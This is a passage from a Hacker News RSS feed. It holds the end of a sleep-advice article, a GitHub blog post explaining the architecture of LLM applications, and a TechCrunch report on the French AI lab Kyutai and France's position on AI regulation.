else stop engaging in revenge bedtime procrastination (e.g., your child if you’re a parent). However, if you do this, make sure to avoid exacerbating the issues that cause revenge bedtime procrastination in the first place (e.g., making the procrastinator feel that they have no control by forcing them to go to bed at a certain time). Instead, <a href="https://doi.org/10.1007/s12144-018-9825-7">focus</a> on helping the procrastinator develop intrinsic and autonomous motivation for going to bed on time, while allowing them to maintain a sense of control, for example by talking to them about this behavior and asking them what they think could help them avoid it.</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The architecture of today's LLM applications (137 pts)]]></title>
            <link>https://github.blog/2023-10-30-the-architecture-of-todays-llm-applications/</link>
            <guid>38332137</guid>
            <pubDate>Sun, 19 Nov 2023 12:41:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.blog/2023-10-30-the-architecture-of-todays-llm-applications/">https://github.blog/2023-10-30-the-architecture-of-todays-llm-applications/</a>, See on <a href="https://news.ycombinator.com/item?id=38332137">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    


<main role="main" id="post-74969">
  
<p>We want to empower you to experiment with LLM models, build your own applications, and discover untapped problem spaces. That’s why we sat down with GitHub’s <a href="https://github.com/whatsinfinitum" target="_blank" rel="noopener">Alireza Goudarzi</a>, a senior machine learning researcher, and <a href="https://github.com/wunderalbert" target="_blank" rel="noopener">Albert Ziegler</a>, a principal machine learning engineer, to discuss the emerging architecture of today’s LLMs.</p>
<p>In this post, we’ll cover five major steps to building your own LLM app, the emerging architecture of today’s LLM apps, and problem areas that you can start exploring today.</p>
<h2 id="five-steps-to-building-an-llm-app">Five steps to building an LLM app<a href="#five-steps-to-building-an-llm-app" aria-label="Five steps to building an LLM app"></a></h2>
<p>Building software with LLMs, or any machine learning (ML) model, is <a href="https://karpathy.medium.com/software-2-0-a64152b37c35" target="_blank" rel="noopener">fundamentally different</a> from building software without them. For one, rather than compiling source code into binary to run a series of commands, developers need to navigate datasets, embeddings, and parameter weights to generate consistent and accurate outputs. After all, LLM outputs are probabilistic and don’t produce the same predictable outcomes.</p>
<figure id="attachment_74972"><a href="https://github.blog/wp-content/uploads/2023/10/FivestepstobuildingLLMapp.png?resize=1022%2C537?w=1022" target="_blank" rel="noopener"><img decoding="async" width="1022" height="537" src="https://github.blog/wp-content/uploads/2023/10/FivestepstobuildingLLMapp.png?resize=1022%2C537" alt="Diagram that lists the five steps to building a large language model application. Data source for diagram is detailed here: https://github.blog/?p=74969&amp;preview=true#five-steps-to-building-an-llm-app" loading="lazy" srcset="https://github.blog/wp-content/uploads/2023/10/FivestepstobuildingLLMapp.png?resize=1022%2C537?w=1022 1022w, https://github.blog/wp-content/uploads/2023/10/FivestepstobuildingLLMapp.png?resize=1022%2C537?w=300 300w, https://github.blog/wp-content/uploads/2023/10/FivestepstobuildingLLMapp.png?resize=1022%2C537?w=768 768w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a><figcaption>Click on diagram to enlarge and save.</figcaption></figure>
<p><strong>Let’s break down, at a high level, the steps to build an LLM app today. <g-emoji fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f447.png?v8" alias="point_down">👇</g-emoji></strong></p>
<p><strong>1. Focus on a single problem, first</strong>. The key? Find a problem that’s the right size: one that’s focused enough so you can quickly iterate and make progress, but also big enough so that the right solution will wow users.</p>
<p>For instance, rather than trying to address all developer problems with AI, the GitHub Copilot team initially focused on one part of the software development lifecycle: <a href="https://github.blog/2023-09-06-how-to-build-an-enterprise-llm-application-lessons-from-github-copilot/" target="_blank" rel="noopener">coding functions in the IDE</a>.</p>
<p><strong>2. Choose the right LLM</strong>. You’re saving costs by building an LLM app with a pre-trained model, but how do you pick the right one? Here are some factors to consider:</p>
<ul>
<li><strong>Licensing</strong>. If you hope to eventually sell your LLM app, you’ll need to use a model that has an API licensed for commercial use. To get you started on your search, here’s a community-sourced <a href="https://github.com/eugeneyan/open-llms" target="_blank" rel="noopener">list of open LLMs that are licensed for commercial use</a>.</li>
<li><strong>Model size.</strong> The size of LLMs can range from 7 to 175 billion parameters—and some, like <a href="https://learn.microsoft.com/en-us/semantic-kernel/prompt-engineering/llm-models" target="_blank" rel="noopener">Ada</a>, are even as small as 350 million parameters. Most LLMs (at the time of writing this post) range in size from 7-13 billion parameters.</li>
</ul>
<p>Conventional wisdom tells us that if a model has more parameters (variables that can be adjusted to improve a model’s output), the better the model is at learning new information and providing predictions. However, the <a href="https://spectrum.ieee.org/large-language-models-size" target="_blank" rel="noopener">improved performance of smaller models</a> is challenging that belief. Smaller models are also usually faster and cheaper, so improvements to the quality of their predictions make them a viable contender compared to big-name models that might be out of scope for many apps.</p>

<ul>
<li><strong>Model performance</strong>. Before you customize your LLM using techniques like fine-tuning and in-context learning (which we’ll cover below), evaluate how well and fast—and how consistently—the model generates your desired output. To measure model performance, you can use <strong>offline evaluations</strong>.</li>
</ul>

<p><strong>3. Customize the LLM</strong>. When you train an LLM, you’re building the scaffolding and neural networks to enable deep learning. When you customize a pre-trained LLM, you’re adapting the LLM to specific tasks, such as generating text around a specific topic or in a particular style. The section below will focus on techniques for the latter. To customize a pre-trained LLM to your specific needs, you can try in-context learning, reinforcement learning from human feedback (RLHF), or fine-tuning.</p>
<ul>
<li><strong>In-context learning,</strong> sometimes referred to as <a href="https://github.blog/2023-06-20-how-to-write-better-prompts-for-github-copilot/" target="_blank" rel="noopener">prompt engineering</a> by end users, is when you provide the model with specific instructions or examples at the time of inference—or the time you’re querying the model—and asking it to infer what you need and generate a contextually relevant output.</li>
</ul>
<p>In-context learning can be done in a variety of ways, like providing examples, rephrasing your queries, and adding a sentence that states your goal at a high-level.</p>
<ul>
<li><strong>RLHF</strong> comprises a reward model for the pre-trained LLM. The reward model is trained to predict if a user will accept or reject the output from the pre-trained LLM. The learnings from the reward model are passed to the pre-trained LLM, which will adjust its outputs based on user acceptance rate.</li>
</ul>
<p>The benefit to RLHF is that it doesn’t require supervised learning and, consequently, expands the criteria for what’s an acceptable output. With enough human feedback, the LLM can learn that if there’s an 80% probability that a user will accept an output, then it’s fine to generate. Want to try it out? Check out these <a href="https://github.com/opendilab/awesome-RLHF" target="_blank" rel="noopener">resources, including codebases, for RLHF</a>.</p>
<ul>
<li><strong>Fine-tuning</strong> is when the model’s generated output is evaluated against an intended or known output. For example, you know that the sentiment behind a statement like this is negative: “The soup is too salty.” To evaluate the LLM, you’d feed this sentence to the model and query it to label the sentiment as positive or negative. If the model labels it as positive, then you’d adjust the model’s parameters and try prompting it again to see if it can classify the sentiment as negative.</li>
</ul>
<p>Fine-tuning can result in a highly customized LLM that excels at a specific task, but it uses supervised learning, which requires time-intensive labeling. In other words, each input sample requires an output that’s labeled with exactly the correct answer. That way, the actual output can be measured against the labeled one and adjustments can be made to the model’s parameters. The advantage of RLHF, as mentioned above, is that you don’t need an exact label.</p>
<p><strong>4. Set up the app’s architecture</strong>. The different components you’ll need to set up your LLM app can be roughly grouped into three categories:</p>
<ul>
<li><strong>User input</strong> which requires a UI, an LLM, and an app hosting platform.</li>
<li><strong>Input enrichment and prompt construction tools.</strong> This includes your data source, embedding model, a vector database, prompt construction and optimization tools, and a data filter.
</li>
<li>
<p><strong>Efficient and responsible AI tooling,</strong> which includes an LLM cache, LLM content classifier or filter, and a telemetry service to evaluate the output of your LLM app.</p>
</li>
</ul>
<p><strong>5. Conduct online evaluations of your app.</strong> These evaluations are considered “online” because they assess the LLM’s performance during user interaction. For example, online evaluations for GitHub Copilot are measured through acceptance rate (how often a developer accepts a completion shown to them), as well as the retention rate (how often and to what extent a developer edits an accepted completion).</p>

<hr>
<h2 id="the-emerging-architecture-of-llm-apps">The emerging architecture of LLM apps<a href="#the-emerging-architecture-of-llm-apps" aria-label="The emerging architecture of LLM apps"></a></h2>
<p>Let’s get started on architecture. We’re going to revisit our friend <a href="https://github.blog/2023-07-17-prompt-engineering-guide-generative-ai-llms/#building-applications-using-llms" target="_blank" rel="noopener">Dave</a>, whose Wi-Fi went out on the day of his World Cup watch party. Fortunately, Dave was able to get his Wi-Fi running in time for the game, thanks to an LLM-powered assistant.</p>
<p><strong>We’ll use this example and the diagram above to <strong>walk through a user flow with an LLM app, and break down the kinds of tools you’d need to build it. <g-emoji fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f447.png?v8" alias="point_down">👇</g-emoji></strong></strong></p>
<figure id="attachment_74991"><a href="https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=1536" target="_blank" rel="noopener"><img decoding="async" width="4088" height="2148" src="https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148" alt="Flow chart that reads from right to left, showing components of a large language model application and how they all work together. Data source for diagram is detailed here: https://github.blog/?p=74969&amp;preview=true#the-emerging-architecture-of-llm-apps" loading="lazy" srcset="https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=4088 4088w, https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=300 300w, https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=768 768w, https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=1024 1024w, https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=1536 1536w, https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=2048 2048w, https://github.blog/wp-content/uploads/2023/10/LLMapparchitecturediagram.png?resize=4088%2C2148?w=3000 3000w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></a><figcaption>Click diagram to enlarge and save.</figcaption></figure>
<h3 id="user-input-tools">User input tools<a href="#user-input-tools" aria-label="User input tools"></a></h3>
<p>When Dave’s Wi-Fi crashes, he calls his internet service provider (ISP) and is directed to an LLM-powered assistant. The assistant asks Dave to explain his emergency, and Dave responds, “My TV was connected to my Wi-Fi, but I bumped the counter, and the Wi-Fi box fell off! Now, we can’t watch the game.”</p>
<p>In order for Dave to interact with the LLM, we need four tools:</p>
<ul>
<li><strong>LLM API and host</strong>: Is the LLM app running on a local machine or in the cloud? In an ISP’s case, it’s probably hosted in the cloud to handle the volume of calls like Dave’s. <a href="https://github.com/vercel" target="_blank" rel="noopener">Vercel</a> and early projects like <a href="https://github.com/jina-ai/rungpt" target="_blank" rel="noopener">jina-ai/rungpt</a> aim to provide a cloud-native solution to deploy and scale LLM apps.</li>
</ul>
<p>But if you want to build an LLM app to tinker, hosting the model on your machine might be more cost effective so that you’re not paying to spin up your cloud environment every time you want to experiment. You can find conversations on GitHub Discussions about hardware requirements for models like LLaMA‚ two of which can be found <a href="https://github.com/facebookresearch/llama/issues/79" target="_blank" rel="noopener">here</a> and <a href="https://github.com/facebookresearch/llama/issues/425" target="_blank" rel="noopener">here</a>.</p>
<ul>
<li><strong>The UI</strong>: Dave’s keypad is essentially the UI, but in order for Dave to use his keypad to switch from the menu of options to the emergency line, the UI needs to include a router tool.</li>
<li><strong>Speech-to-text translation tool</strong>: Dave’s verbal query then needs to be fed through a speech-to-text translation tool that works in the background.</li>
</ul>
<h3 id="input-enrichment-and-prompt-construction-tools">Input enrichment and prompt construction tools<a href="#input-enrichment-and-prompt-construction-tools" aria-label="Input enrichment and prompt construction tools"></a></h3>
<p>Let’s go back to Dave. The LLM can analyze the sequence of words in Dave’s transcript, classify it as an IT complaint, and provide a contextually relevant response. (The LLM’s able to do this because it’s been trained on the internet’s entire corpus, which includes IT support documentation.)</p>
<p><strong>Input enrichment tools</strong> aim to contextualize and package the user’s query in a way that will generate the most useful response from the LLM.</p>
<ul>
<li>A <strong>vector database</strong> is where you can store embeddings, or index high-dimensional vectors. It also increases the probability that the LLM’s response is helpful by providing additional information to further contextualize your user’s query.</li>
</ul>
<p>Let’s say the LLM assistant has access to the company’s complaints search engine, and those complaints and solutions are stored as embeddings in a vector database. Now, the LLM assistant uses information not only from the internet’s IT support documentation, but also from documentation specific to customer problems with the ISP.</p>
<ul>
<li>But in order to retrieve information from the vector database that’s relevant to a user’s query, we need an <strong>embedding model</strong> to translate the query into an embedding. Because the embeddings in the vector database, as well as Dave’s query, are translated into high-dimensional vectors, the vectors will capture both the semantics and intention of the natural language, not just its syntax.</li>
</ul>
<p>Here’s a list of <a href="https://github.com/topics/text-embedding" target="_blank" rel="noopener">open source text embedding models</a>. <a href="https://platform.openai.com/docs/guides/embeddings/embedding-models" target="_blank" rel="noopener">OpenAI</a> and <a href="https://huggingface.co/blog/getting-started-with-embeddings" target="_blank" rel="noopener">Hugging Face</a> also provide embedding models.</p>
<p>Dave’s contextualized query would then read like this:</p>
<pre><code>// pay attention to the the following relevant information.
to the colors and blinking pattern.

// pay attention to the following relevant information.

// The following is an IT complaint from, Dave Anderson, IT support expert.
Answers to Dave's questions should serve as an example of the excellent support
provided by the ISP to its customers.

*Dave: Oh it's awful! This is the big game day. My TV was connected to my
Wi-Fi, but I bumped the counter and the Wi-Fi box fell off and broke! Now we
can't watch the game.
</code></pre>
<p>Not only do these series of prompts contextualize Dave’s issue as an IT complaint, they also pull in context from the company’s complaints search engine. That context includes common internet connectivity issues and solutions.</p>
<p>MongoDB released a public preview of <a href="https://www.mongodb.com/developer/products/atlas/building-generative-ai-applications-vector-search-open-source-models/" target="_blank" rel="noopener">Vector Atlas Search</a>, which indexes high-dimensional vectors within MongoDB. <a href="https://github.com/qdrant" target="_blank" rel="noopener">Qdrant</a>, <a href="https://github.com/pinecone-io" target="_blank" rel="noopener">Pinecone</a>, and <a href="https://github.com/milvus-io" target="_blank" rel="noopener">Milvus</a> also provide free or open source vector databases.</p>

<ul>
<li>A <strong>data filter</strong> will ensure that the LLM isn’t processing unauthorized data, like personal identifiable information. Preliminary projects like <a href="https://github.com/amoffat/HeimdaLLM" target="_blank" rel="noopener">amoffat/HeimdaLLM</a> are working to ensure LLMs access only authorized data.</li>
<li>A <strong>prompt optimization tool</strong> will then help to package the end user’s query with all this context. In other words, the tool will help to prioritize which context embeddings are most relevant, and in which order those embeddings should be organized in order for the LLM to produce the most contextually relevant response. This step is what ML researchers call prompt engineering, where a series of algorithms create a prompt. (A note that this is different from the prompt engineering that end users do, which is also known as in-context learning).</li>
</ul>
<p>Prompt optimization tools like <a href="https://github.com/langchain-ai/langchain" target="_blank" rel="noopener">langchain-ai/langchain</a> help you to compile prompts for your end users. Otherwise, you’ll need to DIY a series of algorithms that retrieve embeddings from the vector database, grab snippets of the relevant context, and order them. If you go this latter route, you could use <a href="https://github.blog/2023-09-20-github-copilot-chat-beta-now-available-for-all-individuals/" target="_blank" rel="noopener">GitHub Copilot Chat</a> or ChatGPT to assist you.</p>
<div><p>Learn how the GitHub Copilot team uses the <a href="https://github.blog/2023-07-17-prompt-engineering-guide-generative-ai-llms/" target="_blank" rel="noopener">Jaccard similarity</a> to decide which pieces of context are most relevant to a user’s query &gt;</p></div>
<h3 id="efficient-and-responsible-ai-tooling">Efficient and responsible AI tooling<a href="#efficient-and-responsible-ai-tooling" aria-label="Efficient and responsible AI tooling"></a></h3>
<p>To ensure that Dave doesn’t become even more frustrated by waiting for the LLM assistant to generate a response, the LLM can quickly retrieve an output from a cache. And in the case that Dave does have an outburst, we can use a content classifier to make sure the LLM app doesn’t respond in kind. The telemetry service will also evaluate Dave’s interaction with the UI so that you, the developer, can improve the user experience based on Dave’s behavior.</p>
<ul>
<li>An <strong>LLM cache</strong> stores outputs. This means instead of generating new responses to the same query (because Dave isn’t the first person whose internet has gone down), the LLM can retrieve outputs from the cache that have been used for similar queries. Caching outputs can reduce latency, computational costs, and variability in suggestions.</li>
</ul>
<p>You can experiment with a tool like <a href="https://github.com/zilliztech/GPTCache" target="_blank" rel="noopener">zilliztech/GPTcache</a> to cache your app’s responses.</p>
<ul>
<li>A <strong>content classifier or filter</strong> can prevent your automated assistant from responding with harmful or offensive suggestions (in the case that your end users take their frustration out on your LLM app).</li>
</ul>
<p>Tools like <a href="https://github.com/derwiki/llm-prompt-injection-filtering" target="_blank" rel="noopener">derwiki/llm-prompt-injection-filtering</a> and <a href="https://github.com/laiyer-ai/llm-guard" target="_blank" rel="noopener">laiyer-ai/llm-guard</a> are in their early stages but working toward preventing this problem.</p>
<ul>
<li>A <strong>telemetry service</strong> will allow you to evaluate how well your app is working with actual users. A service that responsibly and transparently monitors user activity (like how often they accept or change a suggestion) can share useful data to help improve your app and make it more useful.</li>
</ul>
<p><a href="https://github.com/open-telemetry" target="_blank" rel="noopener">OpenTelemetry</a>, for example, is an open source framework that gives developers a standardized way to collect, process, and export telemetry data across development, testing, staging, and production environments.</p>
<p>Learn <a href="https://github.blog/2023-10-16-measuring-git-performance-with-opentelemetry/" target="_blank" rel="noopener">how GitHub uses OpenTelemetry</a> to measure Git performance &gt;</p>

<p>Woohoo! 🥳 Your LLM assistant has effectively answered Dave’s many queries. His router is up and working, and he’s ready for his World Cup watch party. Mission accomplished!</p>
<hr>
<h2 id="real-world-impact-of-llms">Real-world impact of LLMs<a href="#real-world-impact-of-llms" aria-label="Real-world impact of LLMs"></a></h2>
<p>Looking for inspiration or a problem space to start exploring? Here’s a list of ongoing projects where LLM apps and models are making real-world impact.</p>
<ul>
<li>NASA and IBM recently open sourced the <a href="https://www.earthdata.nasa.gov/news/impact-ibm-hls-foundation-model" target="_blank" rel="noopener">largest geospatial AI model</a> to increase access to NASA earth science data. The hope is to accelerate discovery and understanding of climate effects.</li>
<li>Read how the Johns Hopkins Applied Physics Laboratory is designing a <a href="https://www.jhuapl.edu/news/news-releases/230817a-cpg-ai-battlefield-medical-assistance" target="_blank" rel="noopener">conversational AI agent</a> that provides, in plain English, medical guidance to untrained soldiers in the field based on established care procedures.</li>
<li>Companies like <a href="https://github.com/customer-stories/duolingo" target="_blank" rel="noopener">Duolingo</a> and <a href="https://github.com/customer-stories/mercado-libre" target="_blank" rel="noopener">Mercado Libre</a> are using <a href="https://github.com/features/copilot" target="_blank" rel="noopener">GitHub Copilot</a> to help more people learn another language (for free) and democratize ecommerce in Latin America, respectively.</li>
</ul>
<hr>
<h3 id="further-reading">Further reading<a href="#further-reading" aria-label="Further reading"></a></h3>
<ul>
<li><a href="https://github.blog/2023-10-05-a-developers-guide-to-open-source-llms-and-generative-ai/#open-source-llms-available-today">A developer’s guide to open source LLMs and generative AI</a></li>
<li><a href="https://github.blog/2023-10-27-demystifying-llms-how-they-can-do-things-they-werent-trained-to-do/">Demystifying LLMs: How they can do things they weren’t trained to do</a></li>
<li><a href="https://github.blog/2023-07-17-prompt-engineering-guide-generative-ai-llms/">A developer’s guide to prompt engineering and LLMs</a></li>
<li><a href="https://github.blog/2023-09-06-how-to-build-an-enterprise-llm-application-lessons-from-github-copilot/">How to build an enterprise LLM application: Lessons from GitHub Copilot</a></li>
</ul>

      
  </main>


  </div><section>
    <h2>
      Explore more from GitHub    </h2>
    <div>
      <div>
          <p><img src="https://github.blog/wp-content/uploads/2022/05/engineering.svg" width="44" height="44" loading="lazy" alt="Engineering"></p><h3>Engineering</h3>
    <p>
      Posts straight from the GitHub engineering team.    </p>

          <p>
        <a href="https://github.blog/category/engineering/">
          Learn more<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none"><path fill="currentColor" d="M7.28033 3.21967C6.98744 2.92678 6.51256 2.92678 6.21967 3.21967C5.92678 3.51256 5.92678 3.98744 6.21967 4.28033L7.28033 3.21967ZM11 8L11.5303 8.53033C11.8232 8.23744 11.8232 7.76256 11.5303 7.46967L11 8ZM6.21967 11.7197C5.92678 12.0126 5.92678 12.4874 6.21967 12.7803C6.51256 13.0732 6.98744 13.0732 7.28033 12.7803L6.21967 11.7197ZM6.21967 4.28033L10.4697 8.53033L11.5303 7.46967L7.28033 3.21967L6.21967 4.28033ZM10.4697 7.46967L6.21967 11.7197L7.28033 12.7803L11.5303 8.53033L10.4697 7.46967Z"></path><path stroke="currentColor" d="M1.75 8H11" stroke-width="1.5" stroke-linecap="round"></path></svg>
                  </a>
      </p>
      </div>
<div>
          <p><img src="https://github.blog/wp-content/uploads/2023/08/Icon-Circle.svg" width="44" height="44" loading="lazy" alt="GitHub Universe 2023"></p><h3>GitHub Universe 2023</h3>
    <p>
      Get free virtual tickets to the global developer event for AI, security, and DevEx.    </p>

          <p>
        <a href="https://githubuniverse.com/" target="_blank">
          Get free tickets<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M10.604 1h4.146a.25.25 0 01.25.25v4.146a.25.25 0 01-.427.177L13.03 4.03 9.28 7.78a.75.75 0 01-1.06-1.06l3.75-3.75-1.543-1.543A.25.25 0 0110.604 1zM3.75 2A1.75 1.75 0 002 3.75v8.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 12.25v-3.5a.75.75 0 00-1.5 0v3.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-8.5a.25.25 0 01.25-.25h3.5a.75.75 0 000-1.5h-3.5z"></path></svg>
                  </a>
      </p>
      </div>
<div>
          <p><img src="https://github.blog/wp-content/uploads/2022/05/Copilot_Blog_Icon-1.svg" width="44" height="44" loading="lazy" alt="GitHub Copilot"></p><h3>GitHub Copilot</h3>
    <p>
      Don't fly solo. Try 30 days for free.    </p>

          <p>
        <a href="https://github.com/features/copilot?utm_source=blog&amp;utm_medium=bottomnav&amp;utm_campaign=cta&amp;utm_content=copilot" target="_blank">
          Learn more<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M10.604 1h4.146a.25.25 0 01.25.25v4.146a.25.25 0 01-.427.177L13.03 4.03 9.28 7.78a.75.75 0 01-1.06-1.06l3.75-3.75-1.543-1.543A.25.25 0 0110.604 1zM3.75 2A1.75 1.75 0 002 3.75v8.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 12.25v-3.5a.75.75 0 00-1.5 0v3.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-8.5a.25.25 0 01.25-.25h3.5a.75.75 0 000-1.5h-3.5z"></path></svg>
                  </a>
      </p>
      </div>
<div>
          <p><img src="https://github.blog/wp-content/uploads/2022/05/careers.svg" width="44" height="44" loading="lazy" alt="Work at GitHub!"></p><h3>Work at GitHub!</h3>
    <p><span>Check out our current job openings.</span>    </p>

          <p>
        <a href="https://github.com/about/careers" target="_blank">
          Learn more<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M10.604 1h4.146a.25.25 0 01.25.25v4.146a.25.25 0 01-.427.177L13.03 4.03 9.28 7.78a.75.75 0 01-1.06-1.06l3.75-3.75-1.543-1.543A.25.25 0 0110.604 1zM3.75 2A1.75 1.75 0 002 3.75v8.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 12.25v-3.5a.75.75 0 00-1.5 0v3.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-8.5a.25.25 0 01.25-.25h3.5a.75.75 0 000-1.5h-3.5z"></path></svg>
                  </a>
      </p>
      </div>
    </div>
  </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Kyutai AI research lab with a $330M budget that will make everything open source (242 pts)]]></title>
            <link>https://techcrunch.com/2023/11/17/kyutai-is-an-french-ai-research-lab-with-a-330-million-budget-that-will-make-everything-open-source/</link>
            <guid>38331751</guid>
            <pubDate>Sun, 19 Nov 2023 11:48:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2023/11/17/kyutai-is-an-french-ai-research-lab-with-a-330-million-budget-that-will-make-everything-open-source/">https://techcrunch.com/2023/11/17/kyutai-is-an-french-ai-research-lab-with-a-330-million-budget-that-will-make-everything-open-source/</a>, See on <a href="https://news.ycombinator.com/item?id=38331751">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">This morning at Scaleway’s <a href="https://www.ai-pulse.eu/" target="_blank" rel="noopener">ai-PULSE conference</a>, French billionaire and Iliad CEO Xavier Niel gave some extra details about <a href="https://techcrunch.com/2023/09/27/french-billionaire-xavier-niel-pledges-to-invest-up-to-210-million-in-ai/">his plans</a> for an AI research lab based in Paris.</p>
<p>This new lab, called <a href="http://kyutai.org/" target="_blank" rel="noopener">Kyutai</a>, will be a privately funded nonprofit working on artificial general intelligence. It will work with PhD students, postdocs and researchers on research papers and open source projects. When Iliad originally unveiled this research lab, the firm said that Niel was committing €100 million to this project ($109 million at today’s exchange rate).</p>
<p>“Thanks to some amazing friends who are there today, now we are close to €300 million for the financing of this initiative,” Niel said at the conference. Among those “friends” is another French billionaire, Rodolphe Saadé, the CEO of French shipping and logistics giant CMA CGM, who is putting €100 million too. There are other smaller contributors, such as Eric Schmidt’s foundation and some unnamed donators.</p>
<p>This is just a starting point, as Kyutai is open to more donations. “What’s interesting with so many journalists in the room is that the project will potentially interest other investors,” Saadé said at a press conference after the announcement.</p>
<p>As Kyutai will work on foundational models, they will also need some compute power. The good news is that Scaleway, the cloud division of Iliad, recently acquired a thousand Nvidia H100 GPUs. These top-of-the-line GPUs are essential for inference and model training and will be available at cost for Kyutai.</p>
<p>Kyutai has already started hiring for its core scientific team. Six men took the stage this morning to talk about their previous work and what they have in mind for the research lab — Patrick Perez, Edouard Grave, Hervé Jegou, Laurent Mazaré, Neil Zeghidour and Alexandre Defossez. They previously worked for Meta’s AI research team FAIR, Google’s DeepMind division, Inria, etc.</p>
<p>Patrick Perez, who previously worked for Valeo, is going to be the director of the research lab. Kyutai has also put together a team of scientific advisors who are well-known AI researchers — Yejin Choi, Yann LeCun and Bernhard Schölkopf. They will just check everyone’s work once or twice a year and give feedback.</p>
<p>One of the reasons Kyutai thinks it can convince some researchers to join its lab is that researchers will be able to publish research papers.</p>
<p>“Unfortunately, big tech companies tolerate scientific publications less and less. Beyond the ego boost for researchers, it helps to advance research and contribute to the common good,” Niel said during the press conference.</p>
<p>Of course, this isn’t the first open AI research lab. OpenAI, as the name still indicates, started as a nonprofit. But things changed drastically after Sam Altman started working full time on OpenAI in 2019. OpenAI moved to a more traditional corporate structure and raised funding from Microsoft.</p>
<p>Other companies have also been working on open source foundational models, such as Meta with its <a href="https://ai.meta.com/llama/" target="_blank" rel="noopener">Llama model</a> and <a href="https://mistral.ai/" target="_blank" rel="noopener">Mistral AI</a>. Kyutai’s models will be open source too, but the researchers describe their work as open science. They plan to release open source models, but also the training source code and data that explain how they released these models.</p>
<p>“When it comes to the timeline, I don’t think our aim is necessarily to go as fast as Mistral, because our ambition is to provide a scientific purpose, an understanding and a code base to explain the results,” Defossez said at the press conference. But they expect to have something to share within a year.</p>
<p>Mazaré, another researcher from Kyutai’s team, still described <a href="https://techcrunch.com/2023/09/27/mistral-ai-makes-its-first-large-language-model-free-for-everyone/">Mistral AI’s first open source model</a> as a success because many community members have been fine-tuning it and exploring use cases based on the Mistral 7B model.</p>
<p>It’s also going to be interesting to see if a research lab is more efficient at releasing foundational models compared to private companies, and how private companies are going to leverage Kyutai’s work for commercial applications.</p>
<div id="attachment_2630652"><p><img fetchpriority="high" decoding="async" aria-describedby="caption-attachment-2630652" src="https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg" alt="" width="1024" height="768" srcset="https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg 4032w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=150,113 150w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=300,225 300w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=768,576 768w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=680,510 680w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=1536,1152 1536w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=2048,1536 2048w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=1200,900 1200w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-3.jpg?resize=50,38 50w" sizes="(max-width: 1024px) 100vw, 1024px"></p><p id="caption-attachment-2630652"><strong>Image Credits:</strong> Romain Dillet / TechCrunch</p></div>
<p>“I’m also a strong believer in open source, and we need to turn it into a French asset,” French President Emmanuel Macron said in a prerecorded video message at the conference.</p>
<h2>France’s position: Regulating use cases, not models</h2>
<p>Macron also used this opportunity to define and defend France’s position on Europe’s AI Act, saying that use cases should be regulated, not model makers. France has been pushing to <a href="https://techcrunch.com/2023/11/14/eu-ai-act-trilogue-crunch/">water down the AI Act</a> in trilogues (a trilogue is a negotiation between Europe’s three main instances, the Parliament, the Commission and the Council).</p>
<p>“Regulation is not the enemy of innovation, quite the contrary. It’s not a question of defining good models, but we need to ensure that the services made available to our citizens are safe for them, for other economic players and for our democracy,” Macron said.</p>
<p>“With work on the European regulation for artificial intelligence currently in ‘trilogues,’ regulation must be controlled and not punitive, to preserve innovation and regulate usage rather than technology as such,” he added.</p>
<p>Niel basically sided with France’s position on this topic during the press conference. According to him, Europe is lagging behind when it comes to AI innovation, and regulation will slow down European newcomers and diminish the chances of them catching up.</p>
<p>“For the time being we’re more in the innovation part than the regulation part. Creating regulation means it creates barriers to competitors,” Niel said.</p>
<p>Maybe if French AI companies become massively successful, things could change. “I’d love it if one day we could talk about French imperialism in AI,” Niel added later in the conversation.</p>

